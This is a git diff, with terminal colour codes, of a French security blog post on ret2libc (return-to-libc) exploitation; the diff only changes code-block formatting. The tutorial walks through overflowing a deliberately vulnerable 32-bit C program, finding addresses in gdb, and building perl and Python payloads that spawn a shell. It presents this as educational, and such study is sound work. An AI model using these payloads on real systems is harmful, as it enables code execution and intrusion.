@@ -1,0 +1,290 @@
+[1mdiff --git a/_posts/2015-05-24-retour-a-la-libc.md b/_posts/2015-05-24-retour-a-la-libc.md[m
+[1mindex 99eccb8..4e62784 100644[m
+[1m--- a/_posts/2015-05-24-retour-a-la-libc.md[m
+[1m+++ b/_posts/2015-05-24-retour-a-la-libc.md[m
+[36m@@ -33,12 +33,12 @@[m [mCertaines protections existent pour se protéger des buffer overflows. Une des p[m
+ [m
+ Voici une commande permettant de connaitre les flags de la pile :[m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ $ readelf -l add32 | grep GNU_STACK[m
+ [m
+ Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align[m
+ GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ _J'ai ajouté la ligne qui indique le nom des colonnes pour une meilleure compréhension._[m
+[36m@@ -59,10 +59,10 @@[m [mCependant, comme nous ne pouvons plus exécuter le shellcode situé sur la pile,[m
+ ### Organisation de la pile[m
+ [m
+ [m
+[31m-Pour cela, il faut bien comprendre <a href="{{site.baseurl}}fonctionnement-de-la-pile/">le fonctionnement de la pile</a> et la préparer soigneusement pour que l'appel soit fait correctement. Pour nous aider, nous allons étudier le comportement de la pile avec un programme de test :[m
+[32m+[m[32mPour cela, il faut bien comprendre [le fonctionnement de la pile](/fonctionnement-de-la-pile/) et la préparer soigneusement pour que l'appel soit fait correctement. Pour nous aider, nous allons étudier le comportement de la pile avec un programme de test :[m
+ [m
+ [m
+[31m-{% highlight c %}[m
+[32m+[m[32m```c[m
+ #include <stdlib.h>[m
+ [m
+ int main(void) {[m
+[36m@@ -70,11 +70,11 @@[m [mint main(void) {[m
+     system(command);[m
+     return EXIT_SUCCESS;[m
+ }[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ Ce programme lance la commande system(), avec en argument la chaine de caractères `"/bin/sh"`. Si nous le compilons et le désassemblons au sein de gdb, voici le résultat obtenu[m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ $ gcc -m32 appel_system.c -o appel_system[m
+ $ gdb appel_system[m
+ gdb$ disass main[m
+[36m@@ -92,11 +92,11 @@[m [mDump of assembler code for function main:[m
+    0x08048446 <+42>:    leave[m
+    0x08048447 <+43>:    ret[m
+ End of assembler dump.[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ Nous voyons le call vers la fonction system() à la ligne +32. Aux lignes +9 et +17, nous voyons que notre chaine de caractères `"/bin/sh"`; est enregistrée à esp+0x18, sachant que 0x6e69622f est la représentation ASCII de `/bin`; et 0x68732f de `/sh`; (en Little Endian). Ensuite, à la ligne +25, l'adresse valant esp+0x18 est placée dans EAX, puis EAX est mis au sommet de la pile, pointé par ESP. Donc si nous plaçons un breakpoint sur le call, nous devrions voir notre chaine de caractères sur le sommet de la pile :[m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ b *0x0804843c[m
+ Breakpoint 1 at 0x804843c[m
+ gdb$ r[m
+[36m@@ -121,7 +121,7 @@[m [mgdb$ x/xw $esp[m
+ 0xbffff370:    0xbffff388[m
+ gdb$ x/s 0xbffff388[m
+ 0xbffff388:     "/bin/sh"[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ _Vous aurez peut-être remarqué que certaines informations que nous n'avons pas explicitement demandées sont tout de même affichées. C'est parce que j'utilise un .gdbinit particulier, qui m'affiche les instructions à venir ainsi que l'état des registres à chaque fois que j'avance dans l'exécution du programme._[m
+[36m@@ -136,24 +136,24 @@[m [mTout se passe comme prévu. Voici à quoi ressemble la pile à l'état actuel :[m
+ Ensuite, le call va être effectué. Rappelez-vous que l'instruction call vers une adresse est une simplification d'écriture, car elle équivaut à deux instructions :[m
+ [m
+ [m
+[31m-{% highlight nasm %}[m
+[32m+[m[32m```asm[m
+ call <adresse>[m
+ ; est un alias de[m
+ PUSH EIP[m
+ JMP <adresse>[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Vous vous doutiez sûrement du fait qu'un JMP était effectué, puisque l’instruction qui sera exécutée juste après est celle située à l'adresse fournie au call, cependant, il ne faut surtout pas oublier que EIP est poussé sur la pile afin de retenir l'instruction qui suivait le call, instruction qui sera remise dans EIP à la fin de la fonction appelée. Pour en avoir le cœur net, vérifions-le dans gdb. Retenons dans un coin de notre tête l'adresse de l'instruction qui suit le call system (0x8048441)[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ si[m
+ [...][m
+ 0x08048300 in system@plt ()[m
+ gdb$ x/4xw $esp[m
+ 0xbffff36c:    0x08048441    0xbffff388    0xbffff444    0xbffff44c[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Nous avons suivi le call, et nous remarquons bien que l'ancien EIP 0x8048441 a été poussé sur la pile, il est donc juste au dessus de l'adresse de notre chaine "/bin/sh", et la suite du programme peut s'exécuter normalement. La pile ressemble donc à ça :[m
+[36m@@ -193,9 +193,9 @@[m [mComme nous allons lancer un shell via l'appel à system(), l'adresse de retour n[m
+ Pour pouvoir mettre la pile dans cet état, il faudra donc envoyer au programme un buffer sous cette forme :[m
+ [m
+ [m
+[31m-{% highlight text %}[m
+[32m+[m[32m```text[m
+ [ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ][m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ [m
+[36m@@ -205,7 +205,7 @@[m [mC'était un long préambule, mais il était nécessaire pour pouvoir bien compre[m
+ [m
+ Je précise que j'ai fait [une vidéo](https://www.youtube.com/watch?v=M7NQfGobQNo){:target="blank"} qui permet d'illustrer ce même exemple ![m
+ [m
+[31m-{% highlight c %}[m
+[32m+[m[32m```c[m
+ #include <stdio.h>[m
+ #include <stdlib.h>[m
+ #include <string.h>[m
+[36m@@ -223,25 +223,25 @@[m [mint main(int argc, char *argv[])[m
+     else func(argv[1]);[m
+     return 0;[m
+ }[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+[31m-Ce code est le même que celui fourni en exemple dans le deuxième cas pratique de l'article sur les <a href="../buffer-overflow/">Buffer Overflows</a>. Voici le comportement attendu de ce programme :[m
+[32m+[m[32mCe code est le même que celui fourni en exemple dans le deuxième cas pratique de l'article sur les [buffer overflows](/buffer-overflow). Voici le comportement attendu de ce programme :[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ $ ./ret2libc hackndo[m
+ hackndo[m
+ $ ./ret2libc hackndoisawesome[m
+ hackndoisawesome[m
+ Segmentation fault[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Je ne vais pas revenir sur les bases de l'overflow expliquées dans les articles précédents. Dans gdb, nous trouvons le nombre exact de caractères à envoyer pour réécrire EIP[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ r $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')[m
+ AAAAAAAAAAAAAAAAAAAAﾭ�[m
+ [m
+[36m@@ -252,7 +252,7 @@[m [mProgram received signal SIGSEGV, Segmentation fault.[m
+   CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:[m
+ Cannot access memory at address 0xdeadbeef[m
+ 0xdeadbeef in ?? ()[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Il faut donc 20 octets de buffer, puis les 4 octets suivants remplacent la sauvegarde de `EIP`, ce qui fait qu'au retour de la fonction (l'instruction `RET` effectuant un `POP EIP` puis `JMP EIP`), le programme plante car il ne peut pas accéder à l'adresse fournie, `0xdeadbeef` ici.[m
+[36m@@ -267,10 +267,10 @@[m [mRappelons que nous voulons mettre la stack dans l'état suivant :[m
+ Nous venons de trouver l'adresse de la sauvegarde de `EIP`, il s'agit maintenant de trouver l'adresse de la fonction `system()`.  Pour cela, rien de plus simple, il suffit de lancer la commande `print system` ou `p system` dans gdb[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ p system[m
+ $1 = {<text variable, no debug info>} 0xb7ea9e20 <system>[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ L'adresse de la fonction `system` est donc `0xb7ea9e20`.[m
+[36m@@ -279,21 +279,21 @@[m [mL'adresse de la fonction `system` est donc `0xb7ea9e20`.[m
+ Vient alors le tour de la chaine de caractère `"/bin/sh"`. Dans un premier temps, il peut être possible de trouver cette chaine de caractères de manière un peu brutale mais rapide (merci <strong>Mastho</strong> pour l'astuce !), via la commande suivante dans gdb :[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ (gdb) find __libc_start_main,+99999999,"/bin/sh"[m
+ 0xb7fa92e8[m
+ warning: Unable to access target memory at 0xb7fd03f0, halting search.[m
+ 1 pattern found.[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction `__libc_start_main()` (appelée avant notre fonction `main`), et d'une taille de 99 999 999 octets (Pour être sûr). Oui la méthode est violente mais elle a le mérite d'être rapide ! Nous avons donc un endroit dans la mémoire où se situe la chaine recherchée, à l'adresse `0xb7fa92e8` ! Pour nous en convaincre :[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ (gdb) x/s 0xb7fa92e8[m
+ 0xb7fa92e8:     "/bin/sh"[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Pratique non ?[m
+[36m@@ -302,13 +302,13 @@[m [mPratique non ?[m
+ Si jamais cette chaine (ou une autre que vous recherchez) n'est pas présente dans la mémoire du binaire (par exemple la chaine `"I Love Ricard"`, au hasard, mais on va continuer avec `"/bin/sh"`), il existe divers moyens de la stocker, nous allons par exemple la stocker dans une variable d'environnement[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ set environment HACKNDO=/bin/sh[m
+ gdb$ x/s *((char **) environ+7)[m
+ 0xbffff6ca:     "HACKNDO=/bin/sh"[m
+ gdb$ x/s 0xbffff6d2[m
+ 0xbffff6d2:     "/bin/sh"[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Une fois stockée, avec un tout petit peu de tâtonnement, nous trouvons son adresse en mémoire, que nous allons utiliser pour la suite.[m
+[36m@@ -317,19 +317,19 @@[m [mUne fois stockée, avec un tout petit peu de tâtonnement, nous trouvons son adr[m
+ Nous avons donc maintenant tous les éléments nécessaire pour pouvoir lancer notre attaque ret2libc, avec un payload comme suit :[m
+ [m
+ [m
+[31m-{% highlight text %}[m
+[32m+[m[32m```text[m
+ [ 20 x "A" ] [ 0xb7ea9e20 ] [ OSEF ] [ 0xbffff6d2 ][m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Voici le résultat :[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"[m
+ AAAAAAAAAAAAAAAAAAAA ��OSEF����[m
+ $ [m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ On a obtenu notre shell ! Félicitations ![m
+[36m@@ -338,7 +338,7 @@[m [mOn a obtenu notre shell ! Félicitations ![m
+ Pour rendre cette exploitation plus propre, au lieu de mettre une adresse de retour aléatoire, nous pourrions mettre l'adresse de la fonction `exit()`. Voici rapidement comment ça se passe[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"[m
+ AAAAAAAAAAAAAAAAAAAA ��OSEF����[m
+ [m
+[36m@@ -351,13 +351,13 @@[m [mProgram received signal SIGSEGV, Segmentation fault.[m
+   CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:[m
+ Cannot access memory at address 0x4645534f[m
+ 0x4645534f in ?? ()[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Cherchons alors l'adresse de `exit()`[m
+ [m
+ [m
+[31m-{% highlight sh %}[m
+[32m+[m[32m```sh[m
+ gdb$ p exit[m
+ $3 = {<text variable, no debug info>} 0xb7e9d530 <exit>[m
+ gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "\x30\xd5\xe9\xb7" . "\xd2\xf6\xff\xbf"')"[m
+[36m@@ -369,7 +369,7 @@[m [m$ exit[m
+   EAX:Error while running hook_stop:[m
+ No registers.[m
+ gdb$ [m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ Lorsque nous faisons un exit du premier shell avec notre adresse de retour `"OSEF"`, nous avons une faute de segmentation (qui sera loguée, donc qui laisse des traces), tandis qu'en cherchant l'adresse de la fonction `exit()`, et en la plaçant en adresse de retour, la sortie du shell que nous avons forké se fait sans erreur, comme le montre le message **exited normally**.[m
+[36m@@ -378,7 +378,7 @@[m [mLorsque nous faisons un exit du premier shell avec notre adresse de retour `"OSE[m
+ Comme ce n'est pas très lisible, voici un code python qui permet d'exploiter ce binaire avec les éléments que nous avons mis en place[m
+ [m
+ [m
+[31m-{% highlight python %}[m
+[32m+[m[32m```python[m
+ import os[m
+ import struct[m
+ [m
+[36m@@ -399,7 +399,7 @@[m [mpayload += struct.pack("I", exit)[m
+ payload += struct.pack("I", bin_sh)[m
+ [m
+ os.system("./ret2libc \"%s\"" % payload)[m
+[31m-{% endhighlight %}[m
+[32m+[m[32m```[m
+ [m
+ [m
+ J'espère que cet article aura été utile et clair. Rappelez-vous que ce ne sont que des explications à titre éducatives, pour mieux comprendre votre environnement et les dangers qui existent afin d'en prendre conscience, de les comprendre, et de s'en prémunir.[m
